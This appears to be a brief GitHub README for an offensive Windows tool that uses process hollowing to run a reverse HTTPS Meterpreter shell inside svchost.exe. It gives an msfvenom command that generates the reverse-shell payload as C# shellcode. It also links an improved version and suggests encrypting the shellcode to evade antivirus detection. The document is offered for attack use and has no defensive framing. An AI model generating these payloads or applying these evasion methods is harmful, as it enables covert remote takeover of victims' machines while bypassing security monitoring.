# process-hollow
evading suspicion by using process hollowing technique 
writes shellcode into the suspended process
reverse Meterpreter shell executing inside a svchost.exe process
msfvenom -p windows/x64/meterpreter/reverse_https lhost=eth0 lport=443 -f csharp
![image](https://github.com/user-attachments/assets/25effbcc-9f2a-406e-87f8-465596b4b22f)


better version just need to use even more evading 
https://github.com/bmdyy/proc-hollow

Can evade by encrypting shellcode or doing something else other than a reverse shell
